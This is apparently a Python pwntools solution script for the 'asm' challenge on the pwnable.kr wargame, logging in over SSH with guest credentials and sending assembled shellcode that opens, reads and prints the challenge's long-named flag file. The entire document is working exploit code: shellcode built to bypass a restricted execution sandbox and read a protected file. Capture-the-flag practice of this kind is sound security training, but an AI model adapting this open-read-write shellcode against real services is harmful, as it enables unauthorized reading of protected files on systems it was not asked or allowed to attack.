#coding=utf-8
from pwn import *

context.binary = './asm'
debug = 0
if debug:
    p = process('./asm')
else:
    con = ssh(host = 'pwnable.kr', port = 2222, user = 'asm', password = 'guest')
    con.set_working_directory('/home/asm')
    p = con.process('nc 0 9026', shell=True)

payload = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.read('rax', 'rsp', 300)
payload += shellcraft.write(1, 'rsp', 300)
payload = asm(payload)

p.sendlineafter('shellcode: ', payload)
print p.recvall(1)
